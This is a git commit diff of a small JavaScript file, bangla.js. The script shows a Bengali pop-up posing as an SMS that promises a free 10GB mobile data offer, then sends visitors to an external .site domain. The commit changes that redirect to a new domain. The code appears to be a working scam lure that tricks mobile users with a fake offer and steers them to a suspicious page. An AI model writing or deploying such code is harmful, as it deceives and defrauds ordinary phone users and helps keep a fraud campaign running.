645fcab1cd96059336b57b8125169c2d0e13d770
usorondo10 <tektite.almond-9j@icloud.com>
2026-07-16 06:11:36 +0100

    Update bangla.js

--- bangla.js
+++ bangla.js
@@ -1,5 +1,5 @@
 var password = '১০ জিবি সক্রিয় করুন'
 password=prompt('SMS: অভিনন্দন, আপনার মোবাইল নম্বরটি 10GB পাওয়ার যোগ্য, আপনার মোবাইল নম্বরটি প্রবেশ করাতে OK ক্লিক করুন।','১০ জিবি সক্রিয় করুন');
 if (password != '১০ জিবি সক্রিয় করুন') {
-location.href='https://www.bishopofitid.site/tarique-rahman';
+location.href='https://www.titudeofitid.site/tarique-rahman';
 }
